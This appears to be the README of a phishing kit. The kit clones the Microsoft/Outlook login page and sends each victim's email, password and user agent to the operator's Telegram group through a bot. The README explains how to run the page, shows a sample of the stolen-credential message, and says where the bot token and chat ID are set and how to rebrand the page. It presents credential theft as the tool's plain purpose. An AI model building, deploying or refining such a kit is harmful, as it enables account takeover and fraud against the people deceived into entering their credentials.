# Outlook-style login page (Telegram forwarding)

Clone of the Microsoft/Outlook login page. When a user enters email and password and clicks **Sign in**, the page sends a message to your Telegram group with the email, password, and user agent.

## Usage

Open `index.html` in a browser (or serve the folder with any static server). Use the form: email → Next → password → Sign in.

Your Telegram group receives a message like:

```
🔐 Login
Email: user@example.com
Password: ••••••••
User-Agent: Mozilla/5.0 ...
```

Bot token and chat ID are in `assets/app.js`. Change them there if you use a different bot or chat.

## Customization

Replace `assets/logo.png`, `assets/favicon.ico`, and text in `index.html` for your branding.
